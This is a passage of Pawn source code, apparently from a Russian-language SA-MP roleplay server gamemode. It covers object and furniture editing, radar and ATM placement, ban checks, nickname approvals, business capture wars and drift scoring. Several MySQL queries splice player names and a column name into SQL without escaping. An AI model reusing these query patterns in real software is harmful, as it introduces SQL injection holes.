			new_pos[3] = rz - pos[3];

			new Float:final_pos[2];
			final_pos[0] = (new_pos[0] * floatcos(new_pos[3], degrees)) + (new_pos[1] * floatsin(new_pos[3], degrees));
			final_pos[1] = (new_pos[1] * floatcos(new_pos[3], degrees)) - (new_pos[0] * floatsin(new_pos[3], degrees));

			AttachDynamicObjectToVehicle(objectid, GetPlayerVehicleID(playerid), final_pos[0], final_pos[1], new_pos[2], rx, ry, new_pos[3]);
		}
	}
	else if(GetPVarInt(playerid,"RedObj") > 0 || GetPVarInt(playerid,"Object") > 0)
	{
	    if(GetPVarInt(playerid,"RedObj") > 0)
		{
		    new i = GetPVarInt(playerid,"RedObj")-1;
		    new idx = GetPVarInt(playerid,"PlayerHouse");
			if(response == EDIT_RESPONSE_FINAL)
			{
			   // DestroyDynamicObject(objectid);
	            MebelInfo[i][idx][mx] = x;
	            MebelInfo[i][idx][my] = y;
	            MebelInfo[i][idx][mz] = z;
	            MebelInfo[i][idx][mrx] = rx;
	            MebelInfo[i][idx][mry] = ry;
	            MebelInfo[i][idx][mrz] = rz;
				SetDynamicObjectPos(MebelInfo[i][idx][mobjid],MebelInfo[i][idx][mx],MebelInfo[i][idx][my],MebelInfo[i][idx][mz]);
                SetDynamicObjectRot(MebelInfo[i][idx][mobjid],MebelInfo[i][idx][mrx],MebelInfo[i][idx][mry],MebelInfo[i][idx][mrz]);
		//		MebelInfo[i][idx][mobjid] = CreateDynamicObject(MebelInfo[i][idx][mmodel],MebelInfo[i][idx][mx],MebelInfo[i][idx][my],MebelInfo[i][idx][mz]
		//		,MebelInfo[i][idx][mrx],MebelInfo[i][idx][mry],MebelInfo[i][idx][mrz],idx,HInfo[idx][hInt],-1,300.0,300.0);
                Streamer_UpdateEx(playerid,MebelInfo[i][idx][mx],MebelInfo[i][idx][my],MebelInfo[i][idx][mz],idx,HInfo[idx][hInt]);
				SaveMebel(i,GetPVarInt(playerid,"PlayerHouse"));
				DeletePVar(playerid,"RedObj");
				DeletePVar(playerid,"RedObj1");
				CancelEdit(playerid);
				SendClientMessage(playerid,CREWARD,"Вы установили мебель");
			}
			if(response == EDIT_RESPONSE_CANCEL)
			{
				DestroyDynamicObject(objectid);
				if(GetPVarInt(playerid,"RedObj1") > 0)
				{
					MebelInfo[i][idx][mobjid] = CreateDynamicObject(MebelInfo[i][idx][mmodel],MebelInfo[i][idx][mx],MebelInfo[i][idx][my],MebelInfo[i][idx][mz]
					,MebelInfo[i][idx][mrx],MebelInfo[i][idx][mry],MebelInfo[i][idx][mrz],idx,HInfo[idx][hInt],-1,300.0,300.0);
				}
				CancelEdit(playerid);
				DeletePVar(playerid,"RedObj");
				DeletePVar(playerid,"RedObj1");
				SendClientMessage(playerid,CREWARD,"Вы отменили установку мебели");
			}
		}
		if(GetPVarInt(playerid,"Object") > 0)
		{
			if(response == EDIT_RESPONSE_CANCEL)
			{
				DestroyDynamicObject(objectid);
				CancelEdit(playerid);
				DeletePVar(playerid,"Sas");
				DeletePVar(playerid,"Object");
			}
			if(response == EDIT_RESPONSE_FINAL)
			{
				PlayerInfo[playerid][pObject][GetPVarInt(playerid,"Sas")] = CreateDynamicObject(Object[GetPVarInt(playerid,"Object")-1],x,y,z,rx,ry,rz);
				if(Object[GetPVarInt(playerid,"Object")-1] == 2899) PlayerInfo[playerid][pObjectSp] = CreateDynamicSphere(x, y, z, 7.0);
				new str[100];
				format(str,sizeof(str),"ID: %d\nУстановил: %s",PlayerInfo[playerid][pObject][GetPVarInt(playerid,"Sas")],PlayerInfo[playerid][pSendername]);
				PlayerInfo[playerid][pLable][GetPVarInt(playerid,"Sas")] = CreateDynamic3DTextLabel(str, CBLUE, x,y,z+1.5,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0, GetPlayerVirtualWorld(playerid));
				DestroyDynamicObject(objectid);
				CancelEdit(playerid);
				static const fmt_string[] = "[R] %s установил объект (Model: %d | ID: %d)!";
				new str1[sizeof(fmt_string)+MAX_PLAYER_NAME];
				format(str1, sizeof(str1), fmt_string,PlayerInfo[playerid][pSendername],Object[GetPVarInt(playerid,"Object")-1],PlayerInfo[playerid][pObject][GetPVarInt(playerid,"Sas")]);
				SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str1);
				DeletePVar(playerid,"Sas");
				DeletePVar(playerid,"Object");
			}
		}
	}
	else
	{
		if(response == EDIT_RESPONSE_FINAL)
		{
			SetDynamicObjectPos(objectid, oldX, oldY, oldZ);
			SetDynamicObjectRot(objectid, oldRotX, oldRotY, oldRotZ);
		}
		if(response == EDIT_RESPONSE_CANCEL)
		{
			DestroyDynamicObject(objectid);
			CancelEdit(playerid);
		}
		if(response == EDIT_RESPONSE_FINAL)
		{
			if(PlayerInfo[playerid][pAdmin] > 4)
			{
			    new str[100];
				format(str,sizeof(str),"CreateDynamicObject(%i, %.2f, %.2f, %.2f, %.2f, %.2f, %.2f);",GetPVarInt(playerid,"ModelID"),x, y, z, rx, ry, rz);
				SendClientMessage(playerid,-1,str);
			}
			CancelEdit(playerid);
		}
	}
	return 1;
}
public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ)
{
	new Float:oldX, Float:oldY, Float:oldZ,
	Float:oldRotX, Float:oldRotY, Float:oldRotZ;
	GetObjectPos(objectid, oldX, oldY, oldZ);
	GetObjectRot(objectid, oldRotX, oldRotY, oldRotZ);
	if(!playerobject) MoveObject(objectid, fX, fY, fZ, 10.0, fRotX, fRotY, fRotZ);
    if(response == EDIT_RESPONSE_FINAL)
	{
	    
		if(GetPVarInt(playerid, "addrad") == 1)
		{
			RadarInfo[TOTALRADAR][rid] = TOTALRADAR;
			RadarInfo[TOTALRADAR][rX] = fX;
			RadarInfo[TOTALRADAR][rY] = fY;
			RadarInfo[TOTALRADAR][rZ] = fZ;
			RadarInfo[TOTALRADAR][rRZ] = fRotZ;
			RadarInfo[TOTALRADAR][rR] = fRotY;
			RadarInfo[TOTALRADAR][rSpeed] = GetPVarInt(playerid, "speed");
			new stringss[140];
			new names[32];
			GetPVarString(playerid,"nameradar",names,sizeof(names));
			query = "";
			format(query, sizeof(query), "INSERT INTO `radar` (`rid`, `rName`, `rX`, `rY`, `rZ`, `rRZ`, `rR`, `rSpeed`, `rObj`) VALUES ('%i', '%s', '%f', '%f', '%f', '%f', '%f', '%d', '%d')",TOTALRADAR,names,fX,fY,fZ,fRotZ,fRotY,RadarInfo[TOTALRADAR][rSpeed],RadarInfo[TOTALRADAR][rObj]);
			mysql_tquery(mysql, query);
			format(stringss, sizeof stringss, "{f7ae11}[Радар]{ffffff}\nМаксимальная скорость: {f7ae11}%d км/ч.{FFFFFF}\nШтраф за нарушение: {f7ae11}50$", RadarInfo[TOTALRADAR][rSpeed]);
			RadarInfo[TOTALRADAR][rLabel] = CreateDynamic3DTextLabel(stringss, 0xFFFFFFFF, RadarInfo[TOTALRADAR][rX], RadarInfo[TOTALRADAR][rY], RadarInfo[TOTALRADAR][rZ]+4.0,10.0);
			DeletePVar(playerid, "addrad");
			DeletePVar(playerid, "speed");
			SendClientMessage(playerid,-1,"Используйте /flymode для установки камеры");
			new str[70];
			format(str,sizeof(str),"Как встанешь на место /setcam %d",TOTALRADAR);
			SendClientMessage(playerid,-1,str);
		}
    }
    else if(response == EDIT_RESPONSE_CANCEL)
	{
        DestroyObject(objectid);
		if(GetPVarInt(playerid, "addrad")==1)
		{
	  		TOTALRADAR--;
	    	DeletePVar(playerid, "addrad");
	  		DeletePVar(playerid, "speed");
        }
    }
	if(response == EDIT_RESPONSE_FINAL)
	{
		if(!playerobject)
		{
			SetObjectPos(objectid, oldX, oldY, oldZ);
			SetObjectRot(objectid, oldRotX, oldRotY, oldRotZ);
		}
		else
		{
			SetPlayerObjectPos(playerid, objectid, oldX, oldY, oldZ);
			SetPlayerObjectRot(playerid, objectid, oldRotX, oldRotY, oldRotZ);
		}
	}
	if(GetPVarInt(playerid,"Stat") > 0)
	{
	    if(response == EDIT_RESPONSE_CANCEL)
	    {
	   		DestroyObject(objectid);
			CancelEdit(playerid);
			DeletePVar(playerid,"Stat");
	    }
	    if(response == EDIT_RESPONSE_FINAL)
		{
		    new str[200];
		    format(str,sizeof(str),"CreateDynamicObject(1257, %.2f, %.2f, %.2f, %.2f, %.2f, %.2f);",fX, fY, fZ, fRotX, fRotY, fRotZ);
			Log("Stat",str);
			DeletePVar(playerid,"Stat");
	    }
	}
	if(GetPVarInt(playerid,"Stat1") > 0)
	{
	    if(response == EDIT_RESPONSE_CANCEL)
	    {
	   		DestroyObject(objectid);
			CancelEdit(playerid);
			DeletePVar(playerid,"Stat1");
	    }
	    if(response == EDIT_RESPONSE_FINAL)
		{
		    new str[200];
		    format(str,sizeof(str),"CreateDynamicObject(1334, %.2f, %.2f, %.2f, %.2f, %.2f, %.2f);",fX, fY, fZ, fRotX, fRotY, fRotZ);
			Log("Mus",str);
			DeletePVar(playerid,"Stat1");
	    }
	}
	if(GetPVarInt(playerid,"Model") > 0)
	{
	    if(response == EDIT_RESPONSE_CANCEL)
	    {
	   		DestroyObject(objectid);
			CancelEdit(playerid);
			DeletePVar(playerid,"Model");
	    }
	    if(response == EDIT_RESPONSE_FINAL)
	    {
	        TOTALBANK++;
	        DestroyObject(objectid);
	        BankInfo[TOTALBANK][id] = TOTALBANK;
	        BankInfo[TOTALBANK][bX] = fX;
	        BankInfo[TOTALBANK][bY] = fY;
	        BankInfo[TOTALBANK][bZ] = fZ;
	        BankInfo[TOTALBANK][bXX] = fRotX;
	        BankInfo[TOTALBANK][bYY] = fRotY;
	        BankInfo[TOTALBANK][bZZ] = fRotZ;
	        BankInfo[TOTALBANK][bObj] = CreateObject(2754,fX,fY,fZ,fRotX,fRotY,fRotZ);
	        query = "";
       		format(query, sizeof(query), "INSERT INTO `"TABLE_BANK"` (`id`,`x`,`y`,`z`,`xx`,`yy`,`zz`) VALUES ('%d','%f', '%f', '%f','%f', '%f', '%f')",TOTALBANK,fX,fY,fZ,fRotX,fRotY,fRotZ);
			mysql_tquery(mysql,query);
			DeletePVar(playerid,"Model");
	        
	    }
	}
	if(response == EDIT_RESPONSE_CANCEL)
	{
		DestroyObject(objectid);
		CancelEdit(playerid);
	}
	if(response == EDIT_RESPONSE_FINAL)
	{
		printf("CreateDynamicObject(%i, %.2f, %.2f, %.2f, %.2f, %.2f, %.2f);",GetPVarInt(playerid,"ModelID"),fX, fY, fZ, fRotX, fRotY, fRotZ);
		CancelEdit(playerid);
	}
	return true;

}

stock OnPlayerPickupExit(playerid)
{
	if(oldpickup[playerid] == -1) return true;
	new Float:z;
	GetPlayerPos(playerid, z, z, z); 
	if(!IsPlayerInRangeOfPoint(playerid,3,PickupX[playerid],PickupY[playerid],z)) oldpickup[playerid] = -1;
	return true;
}
stock SetFractionInt(idx, stolb[], znach)
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_FRACTION" SET  %s = '%d' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_tquery(mysql,Query);
}
stock SetFractionStr(idx, stolb[], znach[])
{
	new Query[128];
	format(Query, sizeof(Query), "UPDATE "TABLE_FRACTION" SET  %s = '%s' WHERE id = '%d' LIMIT 1", stolb, znach, idx);
	return mysql_tquery(mysql,Query);
}
function CheckBan(playerid)
{
    if(cache_get_row_count(mysql)>0)
	{
	    new adm[32],res[64], ban;
	    new time = cache_get_field_content_int(0, "time", mysql);
	    if(time > gettime()) ban = 1;
	    else
		{
		    query = "";
			format(query, sizeof(query), "DELETE FROM bans WHERE name = '%s'", PlayerInfo[playerid][pSendername]);
			mysql_tquery(mysql,query);
		}
		if(ban == 1)
		{
            cache_get_field_content(0, "whobanned", adm, mysql);
            cache_get_field_content(0, "reason", res, mysql);
			SendClientMessage(playerid,CREWARD,"Ваш аккаунт заблокирован");
			static const fmt_string1[] = "~ Администратором: %s";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
			format(str1, sizeof(str1), fmt_string1,adm);
			SendClientMessage(playerid,CRED,str1);
			static const fmt_string3[] = "~ Разблокировка через: %s";
			new str3[sizeof(fmt_string3)+10];
			format(str3, sizeof(str3), fmt_string3,timec(time));
			SendClientMessage(playerid,CRED,str3);
			static const fmt_string2[] = "~ По причине: %s";
			new str2[sizeof(fmt_string2)+64];
			format(str2, sizeof(str2), fmt_string2,res);
			SendClientMessage(playerid,CRED,str2);
			Kick(playerid, FIX_FUNCTION, 1200);
		}
	}
	return 1;
}
stock CheckBanList(playerid)
{
    query = "";
    format(query, sizeof(query), "SELECT * FROM bans WHERE name = '%s'", PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql, query, "CheckBan", "d", playerid);
/*	new vas1[32],vas,adm[32],res[64], ban, ip[24];
	GetPlayerIp(playerid, ip, 20);
	format(query, 128, "SELECT * FROM bans WHERE name = '%s'", PlayerInfo[playerid][pSendername]);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_fetch_row(query))
	{
		mysql_get_field("time", vas1); vas = strval(vas1);
		if(vas > gettime()) ban = 1;
		else
		{
			format(query, sizeof(query), "DELETE FROM bans WHERE name = '%s'", PlayerInfo[playerid][pSendername]);
			mysql_tquery(mysql,query);
		}
	}
	if(ban == 0)
	{
		format(query, 128, "SELECT * FROM bans WHERE ip = '%s'", ip);
		mysql_tquery(mysql,query);
		mysql_store_result();
		if(mysql_fetch_row(query))
		{
			mysql_get_field("time", vas1); vas = strval(vas1);
			if(vas > gettime()) ban = 1;
		}
	}
	if(ban == 1)
	{

	    mysql_get_field("whobanned", adm);
	    mysql_get_field("reason", res);
		SendClientMessage(playerid,CREWARD,"Ваш аккаунт заблокирован");
		static const fmt_string1[] = "~ Администратором: %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,adm);
		SendClientMessage(playerid,CRED,str1);
		static const fmt_string3[] = "~ Разблокировка через: %s";
		new str3[sizeof(fmt_string3)+10];
		format(str3, sizeof(str3), fmt_string3,timec(vas));
		SendClientMessage(playerid,CRED,str3);
		static const fmt_string2[] = "~ По причине: %s";
		new str2[sizeof(fmt_string2)+64];
		format(str2, sizeof(str2), fmt_string2,res);
		SendClientMessage(playerid,CRED,str2);
		Kick(playerid, FIX_FUNCTION, 1200);
	}
	mysql_free_result();*/
}
function ShowBizStats(playerid,i)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    new date[20],money,stat[20];
	    new str[100];
	    query = "";
		strcat(query, "{FFFFFF}Дата\tДоход\tПрибыль\tИзменение\n\n");
		for(new row = 1; row<= rows; row++)
		{
		    money = cache_get_field_content_int(row-1, "money", mysql);
            cache_get_field_content(row-1, "date", date, mysql);
            cache_get_field_content(row-1, "stat", stat, mysql);
            format(str,sizeof(str),"%s\t%d$\t\t\t%d$\t\t%s{ffffff}\n",date,money,money*PlayerInfo[playerid][pBizAC][i]/100,stat);
			strcat(query, str); //("{F85A5A}[Выключена]{FFFFFF}") : ("{20BA09}[Включена]{FFFFFF}")
		}
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Статистика за 15 дней",query,"Закрыть","");
	}
	return 1;
}

function ShowAllFamily(playerid)
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
	    query = "";
	    new str[32+5+20];
	    new stttt[20];
	    new sos[24];
	    new lel;
		for(new row = 1; row<= rows; row++)
		{
            cache_get_field_content(row-1, "name", sos, mysql);
            if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], sos, true) == 0) stttt = " - Лидер";
			else stttt = "";

		    format(str,sizeof(str),"%s%s\n",sos,stttt);
			strcat(query, str);
			ListNick[playerid][lel] = cache_get_field_content_int(row-1, "id", mysql);
			lel++;
		}
		if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0) ShowPlayerDialog(playerid,460,DIALOG_STYLE_LIST,"Состав семьи",query,"Далее","");
		else ShowPlayerDialog(playerid,0,DIALOG_STYLE_LIST,"Состав семьи",query,"Далее","");
	}
	return 1;
}
function CheckNicki(playerid,i)
{
    if(cache_get_row_count(mysql)>0)
	{
	    static const fmt_string[] = "[A]{ffffff} %s отклонил заявку от %s на %s. Причина: Ник уже занят";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[i][pSendername],PlayerInfo[i][pNick]);
		SendAdminMessage(CYELLOW,str);
		format(PlayerInfo[i][pNick],MAX_PLAYER_NAME,"None");
		cmd_ns(playerid,"");
    }
    else
    {
        if(strlen(PlayerInfo[i][pNick]) < 5 || !IsPlayerConnected(i))
		{
		    SendClientMessage(playerid,CGREY,"Игрок отключился от сервера или уже сменил ник");
		    cmd_ns(playerid,"");
		    return true;
		}
		
		format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Сменил ник с %s на %s','%d')",PlayerInfo[playerid][pID],PlayerInfo[i][pSendername],PlayerInfo[i][pNick],gettime());
		mysql_tquery(mysql,query);
		
		static const fmt_string[] = "[A]{ffffff} %s одобрил(а) заявку от %s на %s";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[i][pSendername],PlayerInfo[i][pNick]);
		SendAdminMessage(CYELLOW,str);
		ChangeNick(i);
		for(new o; o < 50; o++) SendClientMessage(i,-1, "");
		static const fmt_string1[] = "Вашу заявку одобрили. Ваш ник: {FFFFFF}%s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[i][pNick]);
		SendClientMessage(i,CYELLOW,str1);
		SendClientMessage(i,CYELLOW,"Так же не забудьте сменить ник в клиенте SAMP на новый");
		format(PlayerInfo[i][pNick],MAX_PLAYER_NAME,"None");
		SaveAccount(i);
		cmd_ns(playerid,"");
    }
    return 1;
}
stock convert(time, &min, &sec, &msec)
{
	new Float:fTime = floatdiv(time, 60000);
	min = floatround(fTime, floatround_tozero);
	sec = floatround(floatmul(fTime - min, 60), floatround_tozero);
	msec = floatround(floatmul(floatmul(fTime - min, 60) - sec, 1000), floatround_tozero);
}
/*function CheckIpIt()
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
		new time,idplayer;
		for(new row = 1; row<= rows; row++)
		{
		    time = cache_get_field_content_int(row-1, "time", mysql);
		    idplayer = cache_get_field_content_int(row-1, "id", mysql);
            if(time < gettime())
			{
			    query = "";
			    format(query, sizeof(query), "DELETE FROM ip WHERE id = '%d'", idplayer);
				mysql_tquery(mysql,query);
			}
		}
	}
}
stock CheckIp()
{
	mysql_tquery(mysql, "SELECT * FROM ip WHERE time != 0", "CheckIpIt");
	format(query, sizeof(query), "SELECT * FROM ip WHERE time != 0");
	mysql_tquery(mysql,query);
	mysql_store_result();
    if(mysql_num_rows() > 0)
    {
        for(new i = 1; i <= mysql_num_rows();i++)
		{
			mysql_fetch_row(query);
			new st2[32],st1,st4,st3[32];
			mysql_get_field("id", st3);
			mysql_get_field("time", st2);
			st1 = strval(st3);
			st4 = strval(st2);
			if(st4 < gettime())
			{
			    format(query, sizeof(query), "DELETE FROM ip WHERE id = '%d'", st1);
				mysql_tquery(mysql,query);
			}
		}
	}
}*/

stock Float:GetVehicleDriftAngle(const vehicleid)
{
    new Float:x, Float:y, Float:z;
    GetVehicleVelocity(vehicleid, x, y, z);
    new Float:unit_interval = floatsqroot(x*x + y*y);
    new Float:arcsin = asin( y/unit_interval );
    new Float:arccos = acos( x/unit_interval );
    new Float:angle;
    if(arcsin >= 0.0) angle = arccos;
    else angle = 360.0 - arccos;
    new Float:real_angle;
    GetVehicleZAngle(vehicleid, real_angle);
    real_angle += 90.0;
    if(real_angle >= 360.0) real_angle -= 360.0;
    if(angle > real_angle) return angle-real_angle;
    else return real_angle-angle;
}
function LomkaOff(playerid)
{
	if(GetPVarInt(playerid,"Lomka"))
	{
	    ClearAnim(playerid);
	    KillTimer(GetPVarInt(playerid,"Lomka"));
	    DeletePVar(playerid,"Lomka");
	    DeletePVar(playerid,"AntiSbiv");
		DeletePVar(playerid,"Sbiv");
	}
	return 1;
}
function PlayerUpdate(playerid)
{
    if(!IsPlayerConnected(playerid) || PlayerLogged[playerid] == false || SpawnReg[playerid] == true) return true;
    if(PlayerInfo[playerid][pRolik] != 0 && PlayerInfo[playerid][pRolik] < gettime())
    {
        PlayerInfo[playerid][pRolik] = 0;
        SetSkin(playerid);
        SendClientMessage(playerid,-1,"Время аренды роликов кончилась");
    }
    if(GetPVarInt(playerid,"CloseT") > 1)
	{
	    PlayerTextDrawHide(playerid,TexturesLoadingP[playerid]);
	    PlayerTextDrawTextSize(playerid, TexturesLoadingP[playerid], 41.0666686*(GetPVarInt(playerid,"CloseS")), 12.444457);
	    PlayerTextDrawShow(playerid,TexturesLoadingP[playerid]);
	    SetPVarInt(playerid,"CloseS",GetPVarInt(playerid,"CloseS")+1);
	    SetPVarInt(playerid,"CloseT",GetPVarInt(playerid,"CloseT")-1);
	}
	else if(GetPVarInt(playerid,"CloseT") == 1)
	{
	    DestroyPlayerObject(playerid,GetPVarInt(playerid,"CloseObj"));
	    TogglePlayerControllable(playerid, 1);
	    DeletePVar(playerid,"CloseS");
	    DeletePVar(playerid,"CloseT");
	    DeletePVar(playerid,"CloseObj");
	    for(new i = 0; i < 8; i++) TextDrawHideForPlayer(playerid,TexturesLoading[i]);
		PlayerTextDrawDestroy(playerid,TexturesLoadingP[playerid]);
    }
    new actorid = GetPlayerTargetActor(playerid);
    if(GetPVarInt(playerid,"Damage") > 0 &&  GetTickCount() > GetPVarInt(playerid,"DamageTimer")) PlayerTextDrawHide(playerid,PointsTD[playerid][0]),DeletePVar(playerid,"Damage");
    if(GetPVarInt(playerid,"PBIZ") && actorid == BIZBOT[GetPVarInt(playerid,"PBIZ")]  && IsAMafia(playerid))
    {
        new i = GetPVarInt(playerid,"PBIZ");
        if(!BizInfo[i][bWar])
        {
	        if(GetPVarInt(playerid,"Capture") < 15)
	        {
	            SetPVarInt(playerid,"Capture",GetPVarInt(playerid,"Capture")+1);
	            new str[10];
	            format(str,sizeof(str),"~r~%d",GetPVarInt(playerid,"Capture"));
	            GameTextForPlayer(playerid, str, 500, 4);
	            ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"SHOP","SHP_Rob_HandsUP",4.0,0,0,0,0,0);
	        }
	        else
	        {
	         	ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				DeletePVar(playerid,"Capture");
	            if(!BizInfo[i][bMafia])
	            {
					static const fmt_string1[] = "[F] %s захватили %s";
					new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+30+30+30];
					format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],BizInfo[i][bName]);
					SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str1);
					BizInfo[i][bMafia] = PlayerInfo[playerid][pMember];
	            }
				else
				{
				    new h,m,c;
					gettime(h,m,c);
					if(h < 10 || h > 22) return SendClientMessage(playerid,CGREY,"Захват территорий происходит с 15:00 до 22:00");
				    if(h == 13 || h == 18 || h == 21)  return SendClientMessage(playerid,CGREY,"Нельзя воевать за полчаса до поезд и полчаса после!");
		            if(FracInfo[PlayerInfo[playerid][pMember]][fCapt] > gettime()) return SendClientMessage(playerid,CGREY,"Захвать бизнесы можно спустя 30 минут после окончания предыдущей войны!");
				    if(BizInfo[i][bMafia] == PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,CGREY,"Вы не можете захватывать бизнес вашей организации");
                    new napad = PlayerInfo[playerid][pMember]-6;
		        	new gzfrac = GZInfo[i][gFrak]-6;
		        	if(CaptInfo[napad][stop]) return SendClientMessage(playerid,CGREY,"Администрация запретила Вам воевать!");
                    if(CaptInfo[gzfrac][stop]) return SendClientMessage(playerid,CGREY,"Администрация запретила организации воевать!");
				    if(CaptInfo[gzfrac][gangnumber] > 0 ) return SendClientMessage(playerid,CGREY,"Организация, держащая данный бизнес, уже сражается за один из других бизнесов");
				    if(BizInfo[i][bWar]  == 1) return SendClientMessage(playerid, CGREY, "Данный бизнес уже захватывают");
				    if(!PlayerInfo[playerid][pQuestS][9])
					{
						PlayerQuest[playerid][9][0]++;
						CheckQuest(playerid,9);
					}
				    PlayerInfo[playerid][pCrimeStats][C_CAPTURE]++;
			    	static const fmt_string1[] = "[F] %s напали на %s. Войну начал: %s (%s)";
					new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+30+30+30];
					format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[playerid][pMember]][fName],FracInfo[GZInfo[i][gFrak]][fName],PlayerInfo[playerid][pSendername],BizInfo[i][bName]);
					SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str1);
					SendFMes(BizInfo[i][bMafia],COLOR_SKLAD,str1);
					SendAdminMessage(CGREY,str1);
					CaptInfo[napad][capture] = BizInfo[i][bMafia];
					CaptInfo[gzfrac][capture] = PlayerInfo[playerid][pMember];
					CaptInfo[napad][gangnumber] = 1;
					CaptInfo[gzfrac][gangnumber] = 2;
					CaptInfo[gzfrac][terid] = i;
					CaptInfo[napad][terid] = i;
					CaptInfo[gzfrac][score] = 0;
					CaptInfo[napad][score] = 0;
					FracInfo[PlayerInfo[playerid][pMember]][fCapt] = gettime()+60*40;
					FracInfo[GZInfo[i][gFrak]][fCapt] = gettime()+60*40;
					BizInfo[i][bWarTime] = 600; //600
					BizInfo[i][bWar] = 1;
					BizInfo[i][bNapad]=  PlayerInfo[playerid][pMember];
					for(new k = 0; k < MAX_PLAYERS; k++)
					{
					    if(!IsPlayerConnected(k) || PlayerLogged[k] == false) continue;
					    if(PlayerInfo[k][pMember] == PlayerInfo[playerid][pMember] || PlayerInfo[k][pMember] == BizInfo[i][bMafia]) CaptGo(k);
					}
				}
	        }
        }
    }

    if(!GetPVarInt(playerid,"ShowInfo"))
    {
		new obj = GetPlayerCameraTargetDynObject(playerid);

		if((obj >= cell[0] && obj <= cell[24]))
		{
		    new Float:x,Float:y,Float:z;
		    GetDynamicObjectPos(obj,x,y,z);
		    if((IsACop(playerid) ||  PlayerInfo[playerid][pMember] == F_MAYOR) && IsPlayerInRangeOfPoint(playerid, 1.0, x,y,z))
		    {
		        SetPVarInt(playerid,"ShowInfo",1);
				ShowInfo(playerid,"press to use H");
		    }
		}
		else if(GetPlayerCameraTargetDynObject(playerid) == PlayerInfo[playerid][pNarkObj])
		{
		    if(PlayerInfo[playerid][pNark])
		    {
		        SetPVarInt(playerid,"ShowInfo",1);
				ShowInfo(playerid,"press to pick up ALT");
		    }
		}
		else if(GetPlayerCameraTargetDynObject(playerid) == PlaneObj && PlaneStatus == 3)
		{
		    if(IsValidDynamicObject(PlaneObj))
		    {
		        SetPVarInt(playerid,"ShowInfo",1);
				ShowInfo(playerid,"press to pick up LALT");
		    }
		}
	 	else if(GetPlayerCameraTargetDynObject(playerid) == objectsam[0])
		{
		    if(IsValidDynamicObject(objectsam[0]))
		    {
		        SetPVarInt(playerid,"ShowInfo",1);
				ShowInfo(playerid,"press to pick up LALT");
		    }
		}
		else if(GetPlayerCameraTargetDynObject(playerid) == objectsam[1])
		{
		    if(IsValidDynamicObject(objectsam[1]))
		    {
		        SetPVarInt(playerid,"ShowInfo",1);
				ShowInfo(playerid,"press to pick up LALT");
		    }
		}
	}
 	else
 	{
 	    printf("1");
	 	if(!GetPlayerCameraTargetDynObject(playerid) && !PlayerInfo[playerid][pHideThis])
		{
		    printf("2");
		    if(GetPVarInt(playerid,"ShowInfo"))
		    {
		    
		        printf("3");
		        DeletePVar(playerid,"ShowInfo");
		        PlayerTextDrawDestroy(playerid,InfoText[playerid]);
				for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
		        printf("4");
		    }
		}
	}
    if(GetPVarInt(playerid,"ZZ") && GetPlayerWeapon(playerid) != 0) SetPlayerArmedWeapon(playerid,0);
    if(GetPVarInt(playerid,"InDrift"))
    {
		new Float:hl;
		GetVehicleHealth(GetPlayerVehicleID(playerid),hl);
		if(hl < 950 && IsPlayerInAnyVehicle(playerid)) RepairVehicle(GetPlayerVehicleID(playerid));
		new vehicleid = GetPlayerVehicleID(playerid);
		if(GetVehicleDriftAngle(vehicleid) > 8.0 && GetVehicleDriftAngle(vehicleid) < 90.0 && GetVehicleSpeed(GetPlayerVehicleID(playerid)) / 2 > 40.0)
		{
		    SetPVarInt(playerid,"Drift",GetPVarInt(playerid,"Drift")+1);
			new string[9-2+11+22];
		    format(string, sizeof(string), "Drift: ~r~+%d~n~~w~Drift Points: ~r~%d", GetPVarInt(playerid,"Drift"),GetPVarInt(playerid,"DriftO"));
		   // PlayerTextDrawSetString(playerid,EXITTEXT[playerid], string);
		    SetPVarInt(playerid,"DriftTimer",GetTickCount()+1000);
		    PlayerPlaySound(playerid,17802,0.0,0.0,0.0);
		}
		else
		{
		    if(GetPVarInt(playerid,"Drift") > 0 && GetPVarInt(playerid,"DriftTimer") - GetTickCount() < 0)
		    {
		        SetPVarInt(playerid,"DriftO",GetPVarInt(playerid,"DriftO")+GetPVarInt(playerid,"Drift"));
		        new string[22];
		        format(string, sizeof(string), "Drift Points: ~r~%d",GetPVarInt(playerid,"DriftO"));
